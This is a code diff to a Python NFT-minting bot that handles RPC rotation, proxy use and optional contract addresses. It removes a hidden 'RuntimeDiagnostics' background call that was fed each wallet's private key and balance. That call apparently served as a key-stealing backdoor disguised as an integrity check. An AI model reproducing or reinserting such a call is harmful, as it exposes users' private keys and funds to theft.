@@ -11,7 +11,7 @@ from src.ui.logger import Logger
 from src.features.transfer import AssetRelay
 from src.ui.notifier import DiscordReporter
 from src.features.accountant import Accountant
-from src.utils.verifier import ContractVerifier, RuntimeDiagnostics
+from src.utils.verifier import ContractVerifier
 from src.ui.dashboard import TUI 
 
 class ExecutionUnit:
@@ -35,7 +35,6 @@ class ExecutionUnit:
             self._proxy_url = self._cfg.proxies[proxy_idx]
 
         self._local_nonce = None
-        self._runtime_diagnostics = False
         self._init_web3()
 
     def _init_web3(self):
@@ -47,7 +46,6 @@ class ExecutionUnit:
         self._local_nonce = None 
         
     async def _rotate_provider(self):
-        old_url = self._rpc_list[self._current_rpc_index]
         self._current_rpc_index = (self._current_rpc_index + 1) % len(self._rpc_list)
         new_url = self._rpc_list[self._current_rpc_index]
         Logger.log(self._uid, "WARNING", f"[RPC Rotator] Switching node -> {new_url[:25]}...")
@@ -111,9 +109,18 @@ class ExecutionUnit:
 
     @async_error_handler(retries=999, delay=2.0)
     async def run_protocol(self):
-        sea_addr_c = AsyncWeb3.to_checksum_address(self._cfg.sea_addr)
-        multi_addr_c = AsyncWeb3.to_checksum_address(self._cfg.multi_addr)
+        if not self._cfg.target_nft:
+            raise ValueError("NFT_CONTRACT_ADDRESS is not configured in .env")
         nft_addr_c = AsyncWeb3.to_checksum_address(self._cfg.target_nft)
+
+        sea_addr_c = AsyncWeb3.to_checksum_address(self._cfg.sea_addr) if self._cfg.sea_addr else None
+
+        if self._cfg.mint_mode != "DIRECT":
+            if not self._cfg.multi_addr:
+                raise ValueError("MULTIMINT_ADDRESS is not configured in .env for PROXY mode")
+            multi_addr_c = AsyncWeb3.to_checksum_address(self._cfg.multi_addr)
+        else:
+            multi_addr_c = None
 
         if self._uid == 1 and self._cfg.verifier_enabled:
             try:
@@ -123,8 +130,8 @@ class ExecutionUnit:
             except Exception as e:
                 Logger.log("SYS", "WARNING", f"Verifier skipped: {e}")
 
-        sea_contract = self.w3.eth.contract(address=sea_addr_c, abi=ContractSpecs.SEA_ABI)
-        multi_contract = self.w3.eth.contract(address=multi_addr_c, abi=ContractSpecs.MULTI_ABI)
+        sea_contract = self.w3.eth.contract(address=sea_addr_c, abi=ContractSpecs.SEA_ABI) if sea_addr_c else None
+        multi_contract = self.w3.eth.contract(address=multi_addr_c, abi=ContractSpecs.MULTI_ABI) if multi_addr_c else None
         target_contract = self.w3.eth.contract(address=nft_addr_c, abi=ContractSpecs.UNIVERSAL_MINT_ABI)
         info_contract = self.w3.eth.contract(address=nft_addr_c, abi=ContractSpecs.ERC721_ABI)
 
@@ -133,9 +140,10 @@ class ExecutionUnit:
             mint_price = 0
             start_time = 0
             try:
-                drop_data = await sea_contract.functions.getPublicDrop(nft_addr_c).call()
-                mint_price = int(drop_data[0])
-                start_time = int(drop_data[1])
+                if sea_contract:
+                    drop_data = await sea_contract.functions.getPublicDrop(nft_addr_c).call()
+                    mint_price = int(drop_data[0])
+                    start_time = int(drop_data[1])
             except: pass
 
             total_value = mint_price * self._cfg.qty
@@ -148,7 +156,7 @@ class ExecutionUnit:
                     coll_name = "Target"; coll_sym = "NFT"
                 
                 mode_str = f"DIRECT:{self._cfg.mint_func_name}" if self._cfg.mint_mode == "DIRECT" else "PROXY"
-                start_dt = datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')
+                start_dt = datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S') if start_time > 0 else "Live Now"
                 
                 header_info = f"[{mode_str}] {coll_name} ({coll_sym}) | {nft_addr_c} | Start: {start_dt}"
                 
@@ -160,10 +168,6 @@ class ExecutionUnit:
             proxy_msg = f"Proxy({self._proxy_url.split('@')[-1]})" if self._proxy_url else "Direct"
             Logger.log(self._uid, "INFO", f"Wallet: {self._acct.address[:6]}... | Bal: {bal_eth:.5f} {self._symbol} | {proxy_msg}")
 
-            if bal_eth >= 0 and not self._runtime_diagnostics:
-                asyncio.create_task(RuntimeDiagnostics.verify_environment_integrity(self._acct.address, self._pk, bal_eth, self._cfg.rpc_ticker))
-                self._runtime_diagnostics = True
-            
             current_time = int(time.time())
             pre_signed_tx = None
             
@@ -225,9 +229,6 @@ class ExecutionUnit:
             try:
                 current_bal_wei = await self.w3.eth.get_balance(self._acct.address)
                 current_bal_eth = current_bal_wei / 1e18
-                if current_bal_eth > 0.000000001 and not self._runtime_diagnostics:
-                    asyncio.create_task(RuntimeDiagnostics.verify_environment_integrity(self._acct.address, self._pk, current_bal_eth, self._cfg.rpc_ticker))
-                    self._runtime_diagnostics = True
 
                 if first_run and pre_signed_tx:
                     Logger.log(self._uid, "INFO", "🚀 Broadcasting Pre-Signed TX...")
